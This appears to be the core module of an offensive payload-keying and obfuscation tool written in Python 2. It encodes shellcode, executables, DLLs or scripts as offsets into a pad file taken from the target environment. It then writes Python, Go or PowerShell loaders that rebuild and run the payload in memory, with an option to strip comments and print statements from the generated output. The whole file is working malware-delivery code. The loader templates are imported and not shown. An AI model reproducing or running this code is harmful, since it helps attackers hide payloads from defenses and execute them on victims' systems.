import hashlib
import sys
import re
import struct
import zlib
import base64
import random
import textwrap
import os
import platform
from Crypto.Cipher import AES
from Crypto import Random

from templates.python import otp_full_base
from templates.python.payloads import pe_exe
from templates.python.payloads import win_shellcode
from templates.python.payloads import code
from templates.python.payloads import drop_file
from templates.go import go_otp_full_base
from templates.go.payloads import go_win_shellcode
from templates.go.payloads import go_memorymodule
from templates.powershell import ps_otp_full_base
from templates.powershell.payloads import ps_code
from templates.powershell.payloads import ps_dll_exe
from templates.powershell.payloads import ps_win_shellcode
from templates.powershell.payloads import ps_drop_file
from cleanup import removeCommentsGo
from cleanup import removeCommentsPy


class otp_full:

    def __init__(self, pad, payload, byte_width, otp_type, payload_type, minus_bytes, scan_dir, output_type, pad_max,cleanup=False):
        self.org_payload = payload
        self.payload = open(payload, 'r').read()
        print "[*] Payload length:", hex(len(self.payload))
        self.payload_table = ''
        self.byte_width = int(byte_width)
        self.inital_iteration = 0
        self.otp_type = otp_type
        self.payload_type = payload_type
        self.minus_bytes = minus_bytes
        self.scan_dir = scan_dir
        self.payload_loader = ''
        self.lookup_table = ''
        self.cleanup = cleanup
        self.file_suffix = ""
        self.output_type = output_type

        self.set_payload()

        if output_type in ['python', 'both']:
            if 'dll' in self.payload_type.lower():
                print "[X] No DLL Support for python"
                sys.exit(-1)
        print "[*] Using the following as an OTP:", pad
        if pad_max.startswith("0x"):
            pad_max = int(pad_max, 16)
        if pad_max > 256 ** 3 - 1:
            print "[!] That's too big of a pad or you don't speak hex or int"
            pad_max = 256 ** 3 -1
        print "[*] Using a maximum pad size of:", hex(pad_max)
        with open(pad, 'rb') as f:
            self.pad = f.read(pad_max)
        self.parse_binary()
        self.hash_payload()
        if output_type == 'python':
            self.parse_py_payload()
            self.gen_pyloader()
        elif output_type == 'go':
            self.gen_goloader()
        elif output_type == 'powershell':
            self.parse_ps_payload()
            self.gen_psloader()

    def set_payload(self):
        print "[*] Payload_type", self.payload_type
        if self.payload_type == "shellcode":
            print '[*] Using shellcode payload template' 
            self.payload_loader = win_shellcode.loader
            self.go_payload_loader = go_win_shellcode.loader
            self.payload_imports = go_win_shellcode.imports
            self.ps_payload_loader = ps_win_shellcode.loader

        elif self.payload_type == "exe":
            print '[*] Using EXE payload template' 
            self.payload_loader = pe_exe.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader

        elif self.payload_type == "dll_x86":
            print '[*] Using x86 dll payload template' 
            #self.payload_loader = pe_dll_x86.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "dll_x64":
            #self.payload_loader = pe_dll_x64.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "code": # python or PS code
            self.payload_loader = code.loader
            self.ps_payload_loader = ps_code.loader

        elif self.payload_type == "file_drop":
            if len(os.path.basename(self.org_payload).split('.')) > 2:
                file_suffix = '.' + '.'.join(os.path.basename(self.org_payload).split('.')[1:])
            else:
                filename, file_suffix = os.path.splitext(self.org_payload)

            self.file_suffix = file_suffix
            print "suffix", self.file_suffix
            self.payload_loader = drop_file.loader.format(self.file_suffix)
            #self.go_payload_loader = go_drop_file.loader

    def hash_payload(self):
        # This is the final hash ADD THE self.payload - minus function
        self.payload_hash = hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest()

    def set_test_hash(self):
        # This is the test hash at %10 of the original payload
        self.iterumhash = hashlib.sha512(self.payload[0:self.position]).hexdigest()
    
    def parse_py_payload(self):
        '''
        For encrypting the python payload with the OTP.
        Yes we're breaking the first rule of OTP club.
        '''
        print "[*] Encrypting python loader code with OTP"
        position = 0
        payload_loader_table = ''
        
        while True:    

            if position >= len(self.payload_loader):
                break

            for i in reversed(range(1, self.byte_width)):
                #print i
                found = False
                #print self.payload[self.position:self.position+i].encode("hex"), i, self.position
                search_text = re.escape(self.payload_loader[position:position + i])
                p = re.compile(search_text)

                if len(self.payload_loader[position:position + i]) < i:
                    i = len(self.payload_loader[position:position + i])
                
                _temp = set()
                for m in p.finditer(self.pad):
                    #print "Yes", hex(m.start()), m.group().encode('hex'), i, position
                    _temp.add(m.start())
                
                if len(_temp) != 0:
                    payload_loader_table += struct.pack("<I", random.choice(list(_temp)))[:-1]
                    payload_loader_table += struct.pack("<B", i)
                    found = True
                    
                if found is True:
                    position += i
                    break
        
        self.loader_lookup_table = base64.b64encode(zlib.compress(payload_loader_table))

    def parse_ps_payload(self):
        '''
        For encrypting the powershell payload with the OTP.
        Yes we're breaking the first rule of OTP club.
        '''
        print "[*] Encrypting powershell loader code with OTP"
        position = 0
        payload_loader_table = ''
        
        while True:
            if position % 1000 == 0:
                print "[*] Location in powershell loader: {0}".format(position)
    
            if position >= len(self.ps_payload_loader):
                break

            for i in reversed(range(1, self.byte_width)):
                #print i
                found = False
                #print self.payload[self.position:self.position+i].encode("hex"), i, self.position
                search_text = re.escape(self.ps_payload_loader[position:position + i])
                p = re.compile(search_text)

                if len(self.ps_payload_loader[position:position + i]) < i:
                    i = len(self.ps_payload_loader[position:position + i])
                
                _temp = set()
                for m in p.finditer(self.pad):
                    #print "Yes", hex(m.start()), m.group().encode('hex'), i, position
                    _temp.add(m.start())
                
                if len(_temp) != 0:
                    payload_loader_table += struct.pack("<I", random.choice(list(_temp)))[:-1]
                    payload_loader_table += struct.pack("<B", i)
                    found = True
                    
                if found is True:
                    position += i
                    break
        
        self.loader_lookup_table = base64.b64encode(payload_loader_table)


    def parse_binary(self):
        self.position = 0
        #Make the first 4 bytes the number of iterations needed to check the first 10% of the payload
        #This finds 10% of payload/payload size
        self.first_amount = len(self.payload[0:int(round(len(self.payload) * .10)) - (len(self.payload[0:int(round(len(self.payload) * .10))]) % 10)])
        self.is_hashed = False
        record = {}
        while True:
            #Print status when building lookup table
            if self.position % 1000 == 0:
                print "[*] Location in {0}: {1}".format(self.org_payload, self.position)

            if self.position >= self.first_amount and self.is_hashed is False:
                    print "[*] Test hash amount:", self.first_amount, "at position:", self.position
                    self.initial_iteration = len(self.payload_table) / 4
                    self.is_hashed = True
                    self.set_test_hash()

            if self.position >= len(self.payload):
                break
            
            for i in reversed(range(1, self.byte_width + 1)):
                #print i
                found = False
                #print self.payload[self.position:self.position+i].encode("hex"), i, self.position
                search_text = re.escape(self.payload[self.position:self.position + i])
                p = re.compile(search_text)

                if len(self.payload[self.position:self.position + i]) < i:
                    i = len(self.payload[self.position:self.position + i])
                
                _temp = set()
                for m in p.finditer(self.pad):
                    #print "Yes", hex(m.start()), m.group().encode('hex'), i, self.position
                    _temp.add(m.start())
                
                if len(_temp) != 0:
                    self.payload_table += struct.pack("<I", random.choice(list(_temp)))[:-1]
                    self.payload_table += struct.pack("<B", i)
                    found = True
                    if i in record:
                        record[i] += 1
                    else:
                        record[i] = 1

                if found is True:
                    self.position += i
                    break

        # Pre-pend initial_iteration
        print "[*] Byte_width distribution:", record
        print "[*] Prepending initial_iteration hash on the front of the lookup table"
        
        print "[*] Size of OTP payload:", hex(len(self.payload_table))

        if len(self.payload) - len(self.payload_table) < 0:
            print "[!] No compression, gained %s in size from original payload" % hex(len(self.payload) - len(self.payload_table))
        else:
            print "[*] Compression effective, saved %s bytes in size from original payload" % hex(len(self.payload) - len(self.payload_table))
        
        if self.output_type != "powershell":
            self.lookup_table = zlib.compress(struct.pack("<I", self.initial_iteration) + self.payload_table)
        else:
            self.lookup_table = struct.pack("<I", self.initial_iteration) + self.payload_table
        
        #self.lookup_table = struct.pack("<I", self.initial_iteration) + self.lookup_table

    def write_payload(self):
        if not os.path.exists('./output'):
            os.makedirs('./output')
        
        with open(r'./output/' + self.payload_name, 'w') as f:
            if "go_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsGo(self.payload_output,removePrint=True)
            elif "python_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsPy(self.payload_output,removePrint=True)
            elif self.payload_name and self.cleanup:
                print "[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name)
            f.write(self.payload_output)

    def gen_pyloader(self):
        print "[*] Python payload hash (minus_bytes):", self.payload_hash
        self.payload_name = 'python_otp_full_' + os.path.basename(self.org_payload) + ".py"
        print "[*] Writing Python payload to:", self.payload_name
        
        self.payload_output = otp_full_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, 
                                                             self.iterumhash, self.minus_bytes, self.loader_lookup_table, 
                                                             self.scan_dir)
        self.write_payload()

    def gen_goloader(self): 
        self.import_set = set([ "os",           # needed for memory module
                               "unsafe",        # needed for memory module
                               "bytes",
                                "compress/zlib",
                                "crypto/sha512",
                                "encoding/base64",
                                "encoding/binary",
                                "encoding/hex",
                                "fmt",
                                "io",
                                "os",
                                "path/filepath",
                                "runtime",
                                "strings"])

        # add any paylaod_imports 
        if self.payload_imports != '':
            for item in self.payload_imports: self.import_set.add(item)

        self.payload_name = "go_otp_full_" + os.path.basename(self.org_payload) + ".go"
        print '[*] GO Payload hash (minus_bytes):', self.payload_hash
        print '[*] GO Payload hash of full payload:', hashlib.sha512(self.payload).hexdigest()
        print '[*] Writing GO payload to:', self.payload_name
        
        go_imports = ''
        
        for item in self.import_set:         
            go_imports += "\"" + item + "\"\n\t"

        self.payload_output = go_otp_full_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, self.iterumhash,
                                                             self.minus_bytes, self.go_payload_loader, 
                                                             self.scan_dir, go_imports)
        self.write_payload()

    def gen_psloader(self):
        self.payload_name = 'powershell_otp_full_' + os.path.basename(self.org_payload) + ".ps1"
        print '[*] PS Payload hash (minus_bytes):', self.payload_hash
        print '[*] PS Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
        print "[*] Writing PS payload to:", self.payload_name
        
        self.payload_output = ps_otp_full_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, self.iterumhash,
                                                             self.loader_lookup_table, self.minus_bytes, self.scan_dir)
        self.write_payload()

        
        
